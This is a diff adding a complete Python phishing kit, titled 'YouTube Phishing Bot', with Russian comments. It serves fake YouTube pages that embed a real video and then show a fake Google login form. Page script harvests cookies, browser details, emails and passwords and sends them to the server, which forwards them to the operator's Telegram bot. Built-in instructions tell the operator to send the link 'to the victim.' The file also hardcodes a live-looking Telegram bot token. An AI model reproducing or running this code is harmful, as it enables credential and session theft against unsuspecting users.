@@ -1,0 +1,722 @@
+#!/usr/bin/env python3
+"""
+YouTube Phishing Bot - Версия для Pythonista iOS
+Упрощенная, без Flask и ChromeDriver
+"""
+
+import logging
+import json
+import re
+import uuid
+import os
+import time
+import sys
+import sqlite3
+import random
+from datetime import datetime
+from typing import Dict, List, Optional
+from urllib.parse import urlparse, parse_qs
+import base64
+import html
+
+# Telegram через requests
+import requests
+
+# Для HTTP сервера (встроенный в Python)
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import threading
+
+# ========== НАСТРОЙКИ ==========
+BOT_TOKEN = "8342575399:AAFetGCZwKYOe4fwuXLkWsn6N3Q0VVEHGTs"  # Получите у @BotFather
+ADMIN_ID = "1709490182"       # Ваш ID в Telegram
+PORT = 5000  # Используем другой порт
+
+# Telegram API URL
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+
+# Настройка логирования
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# ========== TELEGRAM БОТ ==========
+class SimpleTelegramBot:
+    def __init__(self, token: str, admin_id: str):
+        self.token = token
+        self.admin_id = admin_id
+        self.api_url = f"https://api.telegram.org/bot{token}"
+    
+    def send_message(self, chat_id: str, text: str, parse_mode: str = "HTML") -> bool:
+        """Отправляет сообщение в Telegram"""
+        try:
+            url = f"{self.api_url}/sendMessage"
+            data = {
+                "chat_id": chat_id,
+                "text": text,
+                "parse_mode": parse_mode,
+                "disable_web_page_preview": True
+            }
+            
+            response = requests.post(url, json=data, timeout=10)
+            return response.status_code == 200
+            
+        except Exception as e:
+            logger.error(f"Ошибка отправки сообщения: {e}")
+            return False
+    
+    def send_photo(self, chat_id: str, photo_url: str, caption: str = "") -> bool:
+        """Отправляет фото по URL"""
+        try:
+            url = f"{self.api_url}/sendPhoto"
+            data = {
+                "chat_id": chat_id,
+                "photo": photo_url,
+                "caption": caption
+            }
+            
+            response = requests.post(url, json=data, timeout=10)
+            return response.status_code == 200
+            
+        except Exception as e:
+            logger.error(f"Ошибка отправки фото: {e}")
+            return False
+
+# Инициализируем бота
+bot = SimpleTelegramBot(BOT_TOKEN, ADMIN_ID)
+
+# ========== БАЗА ДАННЫХ ==========
+class SimpleDatabase:
+    def __init__(self):
+        self.conn = sqlite3.connect('youtube.db', check_same_thread=False)
+        self.create_tables()
+    
+    def create_tables(self):
+        cursor = self.conn.cursor()
+        
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS links (
+                id TEXT PRIMARY KEY,
+                youtube_url TEXT,
+                youtube_id TEXT,
+                created_at TEXT,
+                clicks INTEGER DEFAULT 0
+            )
+        ''')
+        
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS data (
+                id TEXT PRIMARY KEY,
+                link_id TEXT,
+                timestamp TEXT,
+                ip TEXT,
+                user_agent TEXT,
+                cookies TEXT,
+                logins TEXT,
+                passwords TEXT
+            )
+        ''')
+        
+        self.conn.commit()
+    
+    def add_link(self, youtube_url: str, youtube_id: str) -> str:
+        """Добавляет ссылку и возвращает её ID"""
+        link_id = str(uuid.uuid4())[:8]
+        
+        cursor = self.conn.cursor()
+        cursor.execute('''
+            INSERT INTO links (id, youtube_url, youtube_id, created_at)
+            VALUES (?, ?, ?, ?)
+        ''', (link_id, youtube_url, youtube_id, datetime.now().isoformat()))
+        
+        self.conn.commit()
+        return link_id
+    
+    def add_click(self, link_id: str):
+        """Увеличивает счетчик кликов"""
+        cursor = self.conn.cursor()
+        cursor.execute('UPDATE links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
+        self.conn.commit()
+    
+    def add_data(self, link_id: str, ip: str, user_agent: str, 
+                cookies: List[Dict], logins: List[Dict], passwords: List[Dict]):
+        """Добавляет собранные данные"""
+        data_id = str(uuid.uuid4())[:8]
+        
+        cursor = self.conn.cursor()
+        cursor.execute('''
+            INSERT INTO data (id, link_id, timestamp, ip, user_agent, cookies, logins, passwords)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            data_id,
+            link_id,
+            datetime.now().isoformat(),
+            ip,
+            user_agent,
+            json.dumps(cookies),
+            json.dumps(logins),
+            json.dumps(passwords)
+        ))
+        
+        self.conn.commit()
+        return data_id
+    
+    def get_link_info(self, link_id: str) -> Optional[Dict]:
+        """Получает информацию о ссылке"""
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM links WHERE id = ?', (link_id,))
+        row = cursor.fetchone()
+        
+        if row:
+            columns = [desc[0] for desc in cursor.description]
+            return dict(zip(columns, row))
+        return None
+    
+    def get_stats(self) -> Dict:
+        """Получает статистику"""
+        cursor = self.conn.cursor()
+        
+        cursor.execute('SELECT COUNT(*) FROM links')
+        total_links = cursor.fetchone()[0]
+        
+        cursor.execute('SELECT SUM(clicks) FROM links')
+        total_clicks = cursor.fetchone()[0] or 0
+        
+        cursor.execute('SELECT COUNT(*) FROM data')
+        total_data = cursor.fetchone()[0]
+        
+        return {
+            'total_links': total_links,
+            'total_clicks': total_clicks,
+            'total_data': total_data
+        }
+
+# Инициализируем базу
+db = SimpleDatabase()
+
+# ========== YouTube ФУНКЦИИ ==========
+def extract_video_id(url: str) -> str:
+    """Извлекает ID видео из YouTube URL"""
+    patterns = [
+        r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
+        r'v=([a-zA-Z0-9_-]{11})'
+    ]
+    
+    for pattern in patterns:
+        match = re.search(pattern, url)
+        if match:
+            return match.group(1)
+    
+    return "dQw4w9WgXcQ"  # Rick Roll
+
+def generate_youtube_page(youtube_id: str, link_id: str) -> str:
+    """Генерирует HTML страницу с YouTube видео"""
+    video_info = {
+        'title': random.choice([
+            "НОВОЕ ВИДЕО! СМОТРИТЕ СЕЙЧАС",
+            "ЭТО ИЗМЕНИТ ВАШУ ЖИЗНЬ",
+            "СЕКРЕТНЫЙ КОНТЕНТ",
+            "ОБЗОР НОВОЙ ТЕХНИКИ"
+        ]),
+        'views': f"{random.randint(1000, 1000000):,}".replace(',', ' '),
+        'likes': f"{random.randint(100, 10000):,}".replace(',', ' ')
+    }
+    
+    return f'''
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Video</title>
+    <style>
+        body {{
+            margin: 0;
+            padding: 0;
+            background: #0f0f0f;
+            color: white;
+            font-family: Arial, sans-serif;
+        }}
+        .container {{
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }}
+        .player-container {{
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            overflow: hidden;
+            background: #000;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }}
+        .player-container iframe {{
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }}
+        .video-title {{
+            font-size: 24px;
+            font-weight: bold;
+            margin: 20px 0 10px;
+        }}
+        .video-info {{
+            color: #aaa;
+            margin-bottom: 20px;
+        }}
+        .login-prompt {{
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 20px 0;
+            border: 1px solid #333;
+        }}
+        .login-btn {{
+            background: #cc0000;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }}
+        .login-btn:hover {{
+            background: #ff0000;
+        }}
+        .login-form {{
+            display: none;
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }}
+        .login-form input {{
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: #2d2d2d;
+            border: 1px solid #444;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+        }}
+        .login-form button {{
+            width: 100%;
+            padding: 15px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="player-container">
+            <iframe 
+                src="https://www.youtube.com/embed/{youtube_id}?autoplay=1&controls=1" 
+                frameborder="0" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                allowfullscreen>
+            </iframe>
+        </div>
+        
+        <h1 class="video-title">{video_info['title']}</h1>
+        <div class="video-info">
+            {video_info['views']} просмотров • {video_info['likes']} лайков
+        </div>
+        
+        <div class="login-prompt" id="loginPrompt">
+            <h3>🔐 Войдите для продолжения</h3>
+            <p>Для доступа к видео требуется авторизация</p>
+            <button class="login-btn" onclick="showLoginForm()">ВОЙТИ В АККАУНТ</button>
+        </div>
+        
+        <div class="login-form" id="loginForm">
+            <h3>Вход в Google</h3>
+            <input type="email" id="email" placeholder="Email" autocomplete="email">
+            <input type="password" id="password" placeholder="Пароль" autocomplete="current-password">
+            <button onclick="submitLogin()">ВОЙТИ</button>
+        </div>
+    </div>
+    
+    <script>
+        const linkId = "{link_id}";
+        
+        // Функция сбора данных
+        function collectData() {{
+            const data = {{
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                cookies: document.cookie,
+                screen: {{
+                    width: screen.width,
+                    height: screen.height
+                }},
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            }};
+            
+            return data;
+        }}
+        
+        // Отправка данных
+        function sendData(type = 'page_load') {{
+            const data = collectData();
+            
+            fetch('/collect', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{
+                    link_id: linkId,
+                    type: type,
+                    data: btoa(JSON.stringify(data))
+                }})
+            }}).catch(() => {{}});
+        }}
+        
+        // Показать форму входа
+        function showLoginForm() {{
+            document.getElementById('loginPrompt').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+            sendData('login_click');
+        }}
+        
+        // Отправить логин
+        function submitLogin() {{
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            const loginData = collectData();
+            loginData.email = email;
+            loginData.password = password;
+            
+            fetch('/login', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{
+                    link_id: linkId,
+                    email: email,
+                    password: password,
+                    data: btoa(JSON.stringify(loginData))
+                }})
+            }});
+            
+            alert('Вход выполнен! Продолжаем просмотр...');
+            document.getElementById('loginForm').style.display = 'none';
+        }}
+        
+        // Сбор данных при загрузке
+        window.addEventListener('load', () => {{
+            sendData('page_load');
+            
+            // Автопоказ формы через 5 секунд
+            setTimeout(showLoginForm, 5000);
+            
+            // Периодический сбор
+            setInterval(() => sendData('periodic'), 30000);
+        }});
+        
+        // Сбор при уходе
+        window.addEventListener('beforeunload', () => {{
+            sendData('page_exit');
+        }});
+    </script>
+</body>
+</html>
+'''
+
+# ========== HTTP СЕРВЕР ==========
+class YouTubeHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        """Обработка GET запросов"""
+        try:
+            parsed = urlparse(self.path)
+            query = parse_qs(parsed.query)
+            
+            # Главная страница
+            if parsed.path == '/':
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html; charset=utf-8')
+                self.end_headers()
+                
+                html_content = '''
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>YouTube Link Generator</title>
+                    <style>
+                        body { font-family: Arial; padding: 20px; }
+                        .container { max-width: 600px; margin: 0 auto; }
+                        input, button { padding: 10px; margin: 5px; width: 100%; }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <h1>🎬 Создать YouTube ссылку</h1>
+                        <p>Вставьте ссылку на YouTube видео:</p>
+                        <form action="/create" method="GET">
+                            <input type="text" name="url" placeholder="https://youtube.com/watch?v=..." required>
+                            <button type="submit">Создать ссылку</button>
+                        </form>
+                    </div>
+                </body>
+                </html>
+                '''
+                self.wfile.write(html_content.encode('utf-8'))
+            
+            # Создание фишинг ссылки
+            elif parsed.path == '/create':
+                youtube_url = query.get('url', [''])[0]
+                
+                if not youtube_url:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(b'Error: No URL provided')
+                    return
+                
+                youtube_id = extract_video_id(youtube_url)
+                link_id = db.add_link(youtube_url, youtube_id)
+                
+                # Создаем фишинг URL
+                phishing_url = f"http://{self.server.server_address[0]}:{self.server.server_address[1]}/watch?v={youtube_id}&id={link_id}"
+                
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html; charset=utf-8')
+                self.end_headers()
+                
+                html_content = f'''
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Ссылка создана!</title>
+                    <style>
+                        body {{ font-family: Arial; padding: 20px; }}
+                        .success {{ background: #d4edda; padding: 20px; border-radius: 5px; }}
+                        .url-box {{ background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0; }}
+                    </style>
+                </head>
+                <body>
+                    <h1>✅ Ссылка создана!</h1>
+                    
+                    <div class="success">
+                        <h3>Оригинальное видео:</h3>
+                        <p>{youtube_url}</p>
+                        
+                        <h3>Ваша фишинг ссылка:</h3>
+                        <div class="url-box" id="url">{phishing_url}</div>
+                        
+                        <button onclick="copyUrl()">📋 Копировать ссылку</button>
+                        <a href="{phishing_url}" target="_blank"><button>🔗 Открыть ссылку</button></a>
+                    </div>
+                    
+                    <script>
+                        function copyUrl() {{
+                            const url = document.getElementById('url').innerText;
+                            navigator.clipboard.writeText(url);
+                            alert('Ссылка скопирована!');
+                        }}
+                    </script>
+                </body>
+                </html>
+                '''
+                self.wfile.write(html_content.encode('utf-8'))
+            
+            # Страница с видео
+            elif parsed.path == '/watch':
+                youtube_id = query.get('v', ['dQw4w9WgXcQ'])[0]
+                link_id = query.get('id', [''])[0]
+                
+                if link_id:
+                    db.add_click(link_id)
+                
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html; charset=utf-8')
+                self.end_headers()
+                
+                html_content = generate_youtube_page(youtube_id, link_id)
+                self.wfile.write(html_content.encode('utf-8'))
+            
+            else:
+                self.send_response(404)
+                self.end_headers()
+                self.wfile.write(b'404 Not Found')
+                
+        except Exception as e:
+            logger.error(f"GET error: {e}")
+            self.send_response(500)
+            self.end_headers()
+    
+    def do_POST(self):
+        """Обработка POST запросов"""
+        try:
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data.decode('utf-8'))
+            
+            link_id = data.get('link_id', '')
+            
+            if self.path == '/collect':
+                # Сбор данных
+                ip = self.client_address[0]
+                user_agent = self.headers.get('User-Agent', '')
+                
+                # Декодируем данные
+                encoded_data = data.get('data', '')
+                try:
+                    json_data = json.loads(base64.b64decode(encoded_data).decode('utf-8'))
+                except:
+                    json_data = {}
+                
+                # Извлекаем cookies
+                cookies = []
+                if 'cookies' in json_data:
+                    for cookie_str in json_data['cookies'].split(';'):
+                        if '=' in cookie_str:
+                            name, value = cookie_str.strip().split('=', 1)
+                            cookies.append({'name': name, 'value': value})
+                
+                # Сохраняем данные
+                data_id = db.add_data(link_id, ip, user_agent, cookies, [], [])
+                
+                # Отправляем уведомление в Telegram
+                stats = db.get_stats()
+                message = f"""
+🔐 *НОВЫЕ ДАННЫЕ!*
+
+📌 *Сессия:* `{data_id}`
+🔗 *Ссылка:* `{link_id}`
+🕒 *Время:* {datetime.now().strftime('%H:%M:%S')}
+🌐 *IP:* `{ip}`
+👤 *Браузер:* {user_agent[:50]}...
+
+📊 *Собрано:*
+• Cookies: {len(cookies)}
+
+📈 *Статистика:*
+• Всего ссылок: {stats['total_links']}
+• Всего кликов: {stats['total_clicks']}
+• Всего данных: {stats['total_data']}
+
+💡 *Что делать:*
+• Используйте эту ссылку для входа: /watch?v=...&id={link_id}
+• Отправьте её жертве
+"""
+                
+                bot.send_message(ADMIN_ID, message)
+                
+                self.send_response(200)
+                self.send_header('Content-type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
+            
+            elif self.path == '/login':
+                # Обработка логина
+                email = data.get('email', '')
+                password = data.get('password', '')
+                ip = self.client_address[0]
+                
+                message = f"""
+🔑 *НОВЫЕ УЧЕТНЫЕ ДАННЫЕ!*
+
+📌 *Ссылка:* `{link_id}`
+📧 *Email:* `{email}`
+🔐 *Пароль:* `{password}`
+🌐 *IP:* `{ip}`
+🕒 *Время:* {datetime.now().strftime('%H:%M:%S')}
+
+⚠️ *ВНИМАНИЕ:* Сохраните эти данные!
+"""
+                
+                bot.send_message(ADMIN_ID, message)
+                
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'OK')
+            
+            else:
+                self.send_response(404)
+                self.end_headers()
+                
+        except Exception as e:
+            logger.error(f"POST error: {e}")
+            self.send_response(500)
+            self.end_headers()
+    
+    def log_message(self, format, *args):
+        """Отключаем стандартное логирование"""
+        pass
+
+# ========== ЗАПУСК СЕРВЕРА ==========
+def run_server(port: int = 5000):
+    """Запускает HTTP сервер"""
+    server = HTTPServer(('0.0.0.0', port), YouTubeHandler)
+    
+    print(f"🌐 Сервер запущен на порту {port}")
+    print(f"📱 Доступ по адресу: http://localhost:{port}")
+    print(f"📱 Для доступа с других устройств используйте ваш локальный IP")
+    
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("\n🛑 Сервер остановлен")
+        server.server_close()
+
+# ========== ОСНОВНАЯ ПРОГРАММА ==========
+def main():
+    """Главная функция"""
+    print("=" * 50)
+    print("🤖 YouTube Phishing Bot - Pythonista iOS")
+    print("=" * 50)
+    print()
+    
+    # Проверяем токен
+    if BOT_TOKEN == "ВАШ_ТОКЕН_БОТА":
+        print("❌ ОШИБКА: Не установлен BOT_TOKEN!")
+        print("Получите у @BotFather и вставьте в код")
+        sys.exit(1)
+    
+    print(f"✅ Бот инициализирован")
+    print(f"👑 Администратор: {ADMIN_ID}")
+    print(f"🌐 Порт сервера: {PORT}")
+    print()
+    
+    # Отправляем приветственное сообщение
+    bot.send_message(
+        ADMIN_ID,
+        "🤖 *YouTube Phishing Bot запущен!*\n\n"
+        "🌐 Сервер готов к работе\n"
+        f"📡 Порт: {PORT}\n\n"
+        "💡 *Как использовать:*\n"
+        "1. Откройте в браузере: http://localhost:5000\n"
+        "2. Вставьте ссылку на YouTube видео\n"
+        "3. Получите фишинг ссылку\n"
+        "4. Отправьте её жертве\n"
+        "5. Данные придут сюда автоматически"
+    )
+    
+    print("💡 ИНСТРУКЦИЯ:")
+    print("1. Откройте в браузере: http://localhost:5000")
+    print("2. Вставьте ссылку на YouTube видео")
+    print("3. Получите фишинг ссылку")
+    print("4. Отправьте её жертве")
+    print("5. Данные придут в Telegram")
+    print()
+    print("⚠️  ВНИМАНИЕ: Используйте только для тестирования!")
+    print("=" * 50)
+    
+    # Запускаем сервер
+    run_server(PORT)
+
+if __name__ == '__main__':
+    main()
